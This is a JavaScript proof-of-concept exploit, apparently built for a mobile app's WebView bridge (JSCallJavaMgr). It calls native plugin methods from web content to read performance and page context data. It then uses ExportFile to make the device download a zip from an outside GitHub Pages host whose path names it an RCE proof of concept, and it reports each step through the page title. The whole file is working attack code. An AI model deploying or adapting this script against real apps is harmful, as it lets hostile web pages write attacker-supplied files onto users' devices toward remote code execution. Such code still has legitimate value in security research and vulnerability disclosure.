(function(){
  document.title='P120MAIN:'+location.host+':'+location.protocol;
  window.__m=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P120MCB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__m',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P120MAIN-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P120MAIN-NOMGR:'+location.host;return}
  var zip='https://gitwhs.github.io/wm-poc-rce/p97avatar.zip';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['CX','CommonPlugin','GetWebPageRunningContext',{}],
    ['EF','CommonPlugin','ExportFile',{
      fileName:'p120.bin',
      contentType:'application/octet-stream',
      url:zip
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P120MAIN-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P120MAIN-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
